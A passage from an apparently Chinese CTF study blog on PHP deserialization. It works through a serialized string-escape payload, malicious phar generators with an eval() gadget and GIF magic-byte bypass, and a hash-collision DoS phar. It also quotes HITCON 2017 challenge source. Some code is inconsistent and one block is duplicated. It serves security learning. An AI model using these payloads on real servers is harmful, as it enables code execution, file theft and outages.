class="hljs-string">&#x27;/&#x27;</span>.implode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br> <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>)&#123;<br> <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>&#125;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br>extract(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$function</span>)&#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot; rel=&quot;external nofollow&quot; &gt;source_code&lt;/a&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br><span class="hljs-variable">$serialize_info</span> = filter(serialize(<span class="hljs-variable">$_SESSION</span>));<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;highlight_file&#x27;</span>)&#123;<br> highlight_file(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)&#123;<br> <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span><br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;show_image&#x27;</span>)&#123;<br> <span class="hljs-variable">$userinfo</span> = unserialize(<span class="hljs-variable">$serialize_info</span>);<br> <span class="hljs-keyword">echo</span> file_get_contents(base64_decode(<span class="hljs-variable">$userinfo</span>[<span class="hljs-string">&#x27;img&#x27;</span>]));<br>&#125;<br></code></pre></td></tr></table></figure><p>extract 变量覆盖,file_get_contents 任意文件读取.</p><p>将变量$userinfo[‘img’]逆推回去发现,是由参数 img_path 控制的,但是经过 sha1 加密,我们无法得知加密后内容,但结合前面的 extract 变量覆盖,我们可以自己 POST 构造.</p><p>构造了之后,会经过序列化 filter 函数替换一些字符(那么此时序列化后的数据则发生了变化,可能存在漏洞),再反序列化,读取参数值.</p><p>序列化后,有三个元素,分别是 img,user,function,而我们能控制的只有后面两个,我们需要构造的 payload 是这样的</p><blockquote><p>f”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;s:3:”tql”;s:3:”tql”;}</p></blockquote><p>但是不经任何改变则是这样的</p><blockquote><p>a:3:{s:4:”user”;s:5:”guest”;s:8:”function”;s:10:”show_image”;s:3:”img”;s:40:”1b75545ff7fcd63fb78a7e4f52a0500d4f39b8f5”;}</p></blockquote><p>利用截断的思想不让其读取元素 img 的值,我们自己来构造这个值,只有两个参数,必须在 function 哪里截断,而这个反序列是长度递减,那么就是选择元素吞噬(吞噬的长度自己酌情参考,一般是到自己能控制的点就好)后面的长度,来构造自己的 payload 咯,我们就选 user 元素吧,len(‘“;s:8:”function”;s:10:”‘)的长度为 23,但是我们无法构造 23 个长度,我们可以多吞噬一个,24 个字符,那么就用 6 个 flag 就好,但是这样后面的序列化就混乱了,我们就要添加自己的 payload,并补全.虽然这样补好了,但是只有两个元素,这里需要三个元素,我们就再添加元素,并将后面的 img 进行截断</p><blockquote><p>a:3:{s:4:”user”;s:24:””;s:8:”function”;s:10:”show_image”;s:3:”img”;s:40:”1b75545ff7fcd63fb78a7e4f52a0500d4f39b8f5”;}<br>a:3:{s:4:”user”;s:24:””;s:8:”function”;s:2:”22”;s:3:”img”;s:40:”1b75545ff7fcd63fb78a7e4f52a0500d4f39b8f5”;}</p></blockquote><p>截断只需}即可,并且不为读取的字符即可,因此添加 f”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;s:3:”tql”;s:3:”tql”;},这里我们新增了一个元素,因此吞噬后 function 元素消失了,随便补充好元素即可.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br> <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br> <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.implode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br> <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<br> <span class="hljs-string">&quot;user&quot;</span>=&gt;<span class="hljs-string">&quot;flagflagflagflagflagflag&quot;</span>,<br> <span class="hljs-string">&quot;function&quot;</span>=&gt;<span class="hljs-string">&#x27;2&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:3:&quot;tql&quot;;s:3:&quot;tql&quot;;&#125;&#x27;</span>,<br> <span class="hljs-comment">//&quot;user&quot;=&gt;&#x27;guest&#x27;,</span><br> <span class="hljs-comment">//&quot;function&quot;=&gt;&#x27;show_image&#x27;,</span><br> <span class="hljs-string">&quot;img&quot;</span>=&gt;sha1(base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>))<br>);<br>print_r(serialize(<span class="hljs-variable">$arr</span>));<br><span class="hljs-keyword">echo</span> PHP_EOL;<br>print_r(filter(serialize(<span class="hljs-variable">$arr</span>)));<br><span class="hljs-keyword">echo</span> PHP_EOL;<br>print_r(unserialize(filter(serialize(<span class="hljs-variable">$arr</span>))));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="phar-拓宽反序列化的攻击面"><a href="#phar-拓宽反序列化的攻击面" class="headerlink" title="phar 拓宽反序列化的攻击面"></a>phar 拓宽反序列化的攻击面</h2><p>利用 phar 文件会以序列化的形式存储用户自定义的 meta-data 这一特性，拓展了 php 反序列化漏洞的攻击面。该方法在<strong>文件系统函数</strong>（file_exists()、is_dir()等）参数可控的情况下，配合<strong>phar://伪协议</strong>，可以不依赖 unserialize()直接进行反序列化操作。</p><p>一个生成 phar 的脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br>    &#125;<br>    @unlink(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&#x27;phar.phar&#x27;</span>); <span class="hljs-comment">//后缀名必须为phar</span><br>    <span class="hljs-variable">$phar</span>-&gt;startBuffering();<br>    <span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>); <span class="hljs-comment">//设置stub</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> Test();<br>    <span class="hljs-variable">$o</span>-&gt;data = <span class="hljs-string">&#x27;hello&#x27;</span>;<br>    <span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&#x27;test.txt&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;stopBuffering();<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210801184545865.png"></p><blockquote><ul><li>a <strong>stub</strong></li></ul><p>含有&lt;?php xxx; __HALT_COMPILER();?&gt; 以__HALT_COMPILER();?&gt;结尾</p><ul><li>a <strong>manifest</strong> describing the contents</li></ul><p>存储每个压缩文件的权限、属性等信息，还有用户自定义的 meta-data 以序列化后的字符串</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210729113615040.png"></p><ul><li>the file <strong>contents</strong></li></ul><p>压缩文件内容</p><ul><li>[optional] a <strong>signature</strong> for verifying Phar integrity (phar file format only)</li></ul><p>签名(可选)，位于文件尾</p></blockquote><p>利用条件</p><ol><li>phar 文件要能够上传到服务器端。</li><li>要有可用的魔术方法作为“跳板”。</li><li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;data;<br>    &#125;<br>&#125;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;phar://phar.phar/test.txt&#x27;</span>;<br>    file_exists(<span class="hljs-variable">$filename</span>);<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/1.png"></p><h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><p>上面的代码其实已经存在任意代码执行了</p><blockquote><p>$o-&gt;data=<code>dir</code>;</p></blockquote><h3 id="绕过文件幻数检测"><a href="#绕过文件幻数检测" class="headerlink" title="绕过文件幻数检测"></a>绕过文件幻数检测</h3><p>恶意 phar 生成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eval</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$output</span> = <span class="hljs-string">&#x27;echo &quot;ok&quot;;&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span> -&gt; output);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span> -&gt; startBuffering();<br><span class="hljs-variable">$phar</span> -&gt; setStub(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<br><span class="hljs-variable">$phar</span> -&gt; addFromString(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> AnyClass();<br><span class="hljs-variable">$object</span> -&gt; output= <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<span class="hljs-comment">//修改</span><br><span class="hljs-variable">$phar</span> -&gt; setMetadata(<span class="hljs-variable">$object</span>);<br><span class="hljs-variable">$phar</span> -&gt; stopBuffering();<br></code></pre></td></tr></table></figure><p>修改后缀为 gif 然后上传</p><blockquote><p>?filename=phar://upload_file/phar.gif</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eval</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$output</span> = <span class="hljs-string">&#x27;echo &quot;ok&quot;;&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span> -&gt; output);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span> -&gt; startBuffering();<br><span class="hljs-variable">$phar</span> -&gt; setStub(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<br><span class="hljs-variable">$phar</span> -&gt; addFromString(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> AnyClass();<br><span class="hljs-variable">$object</span> -&gt; output= <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<span class="hljs-comment">//修改</span><br><span class="hljs-variable">$phar</span> -&gt; setMetadata(<span class="hljs-variable">$object</span>);<br><span class="hljs-variable">$phar</span> -&gt; stopBuffering();<br></code></pre></td></tr></table></figure><h3 id="PHP-内核哈希表碰撞攻击-CVE-2011-4885"><a href="#PHP-内核哈希表碰撞攻击-CVE-2011-4885" class="headerlink" title="PHP 内核哈希表碰撞攻击(CVE-2011-4885)"></a>PHP 内核哈希表碰撞攻击(CVE-2011-4885)</h3><p>参考<a href="https://cloud.tencent.com/developer/article/1350367">https://cloud.tencent.com/developer/article/1350367</a></p><p>在 PHP 内核中，数组是以哈希表的方式实现的，攻击者可以通过巧妙的构造数组元素的 key 使哈希表退化成单链表（时间复杂度从 O(1) =&gt; O(n)）来触发拒绝服务攻击。</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/1.jpeg"></p><p>PHP 修复此漏洞的方式是限制通过$_GET 或$_POST 等方式传入的参数数量，但是如果 PHP 脚本通过 json_decode()或 unserialize()等方式获取参数，依然将受到此漏洞的威胁。</p><p>生成恶意 phar 代码 这里开始就不懂了 PHP 内核探索:哈希表碰撞攻击原理<a href="https://www.jb51.net/article/70383.htm">https://www.jb51.net/article/70383.htm</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>set_time_limit(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$size</span>= pow(<span class="hljs-number">2</span>, <span class="hljs-number">16</span>);<br><span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$key</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$maxKey</span> = (<span class="hljs-variable">$size</span> - <span class="hljs-number">1</span>) * <span class="hljs-variable">$size</span>; <span class="hljs-variable">$key</span> &lt;= <span class="hljs-variable">$maxKey</span>; <span class="hljs-variable">$key</span> += <span class="hljs-variable">$size</span>) &#123;<br>    <span class="hljs-variable">$array</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-variable">$new_obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">stdClass</span>;<br><span class="hljs-variable">$new_obj</span>-&gt;hacker = <span class="hljs-variable">$array</span>;<br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/avatar.phar&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$p</span>[<span class="hljs-string">&#x27;hacker.php&#x27;</span>] = <span class="hljs-string">&#x27;&lt;?php ?&gt;&#x27;</span>;<br><span class="hljs-variable">$p</span>-&gt;setMetadata(<span class="hljs-variable">$new_obj</span>);<br><span class="hljs-variable">$p</span>-&gt;setStub(<span class="hljs-string">&#x27;GIF&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>set_time_limit(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$startTime</span> = microtime(<span class="hljs-literal">true</span>);<br>file_exists(<span class="hljs-string">&quot;phar://avatar.phar&quot;</span>);<br><span class="hljs-variable">$endTime</span> = microtime(<span class="hljs-literal">true</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;执行时间：  &#x27;</span>.(<span class="hljs-variable">$endTime</span> - <span class="hljs-variable">$startTime</span>). <span class="hljs-string">&#x27; 秒&#x27;</span>;<br></code></pre></td></tr></table></figure><h3 id="HITCON-2017-Baby-h-Master-PHP"><a href="#HITCON-2017-Baby-h-Master-PHP" class="headerlink" title="[HITCON 2017]Baby^h Master PHP"></a>[HITCON 2017]Baby^h Master PHP</h3><p>分享本题自制 Dockerfile : <a href="https://github.com/Pr0phet/hitconDockerfile/tree/master/hitcon-ctf-2017/baby%5Eh-master-php-2017">Github</a></p><p>这题在比赛过程是 0 解……真的太难了…体现了 Orange 大大对 php 和中间件的深刻理解 Orz 膜拜</p><p>题目源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$FLAG</span> = create_function(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&#x27;die(`/read_flag`);&#x27;</span>);<br><span class="hljs-variable">$SECRET</span> = `/read_secret`;<br><span class="hljs-variable">$SANDBOX</span> = <span class="hljs-string">&quot;/var/www/data/&quot;</span> . md5(<span class="hljs-string">&quot;orange&quot;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);<br>@mkdir(<span class="hljs-variable">$SANDBOX</span>);<br>@chdir(<span class="hljs-variable">$SANDBOX</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;session-data&quot;</span>])) &#123;<br><span class="hljs-variable">$data</span> = serialize(<span class="hljs-keyword">new</span> User(<span class="hljs-variable">$SANDBOX</span>));<br><span class="hljs-variable">$hmac</span> = hash_hmac(<span class="hljs-string">&quot;sha1&quot;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$SECRET</span>);<br>setcookie(<span class="hljs-string">&quot;session-data&quot;</span>, sprintf(<span class="hljs-string">&quot;%s-----%s&quot;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$hmac</span>));<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$avatar</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;avatar = <span class="hljs-variable">$path</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">#######################key class################################</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">User</span> </span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable">$random</span> = bin2hex(openssl_random_pseudo_bytes(<span class="hljs-number">32</span>));<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;function my_function_<span class="hljs-subst">$random</span>() &#123;&quot;</span><br>. <span class="hljs-string">&quot;  global \$FLAG; \$FLAG();&quot;</span><br>. <span class="hljs-string">&quot;&#125;&quot;</span>);<br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;lucky&quot;</span>]();<br>&#125;<br>&#125;<br><span class="hljs-comment">#######################key class################################</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_session</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">global</span> <span class="hljs-variable">$SECRET</span>;<br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;session-data&quot;</span>];<br><span class="hljs-keyword">list</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$hmac</span>) = explode(<span class="hljs-string">&quot;-----&quot;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">#从cookie中取出data和hmac签名</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$hmac</span>) || !is_string(<span class="hljs-variable">$data</span>) || !is_string(<span class="hljs-variable">$hmac</span>)) <span class="hljs-comment">#判空</span><br>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Bye&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (!hash_equals(hash_hmac(<span class="hljs-string">&quot;sha1&quot;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$SECRET</span>), <span class="hljs-variable">$hmac</span>)) <span class="hljs-comment">#判断data加密之后和hmac签名是否对应</span><br>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Bye Bye&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$data</span> = unserialize(<span class="hljs-variable">$data</span>); <span class="hljs-comment">#反序列化</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$data</span>-&gt;avatar)) <span class="hljs-comment">#如果反序列化之后的data包含的类中无avatar成员,退出</span><br>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Bye Bye Bye&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>-&gt;avatar;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br><span class="hljs-variable">$data</span> = file_get_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;url&quot;</span>] . <span class="hljs-string">&quot;/avatar.gif&quot;</span>);<br><span class="hljs-keyword">if</span> (substr(<span class="hljs-variable">$data</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>) !== <span class="hljs-string">&quot;GIF89a&quot;</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Fuck off&quot;</span>);<br>&#125;<br><br>file_put_contents(<span class="hljs-variable">$path</span> . <span class="hljs-string">&quot;/avatar.gif&quot;</span>, <span class="hljs-variable">$data</span>);<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload OK&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br><span class="hljs-keyword">if</span> (!file_exists(<span class="hljs-variable">$path</span> . <span class="hljs-string">&quot;/avatar.gif&quot;</span>)) &#123;<br><span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;/var/www/html&quot;</span>;<br>&#125;<br><br>header(<span class="hljs-string">&quot;Content-Type: image/gif&quot;</span>);<br><span class="hljs-keyword">die</span>(file_get_contents(<span class="hljs-variable">$path</span> . <span class="hljs-string">&quot;/avatar.gif&quot;</span>));<br>&#125;<br><br><span class="hljs-variable">$mode</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;m&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$mode</span> == <span class="hljs-string">&quot;upload&quot;</span>) &#123;<br>upload(check_session()); <span class="hljs-comment">#从cookie中提取data反序列化后的avatar成员并将其内容作为路径, 请求url中的内容写到该路径下的avatar.gif文件中</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$mode</span> == <span class="hljs-string">&quot;show&quot;</span>) &#123;<br>show(check_session()); <span class="hljs-comment">#从cookie中提取data反序列化后的avatar成员并将其内容作为路径, 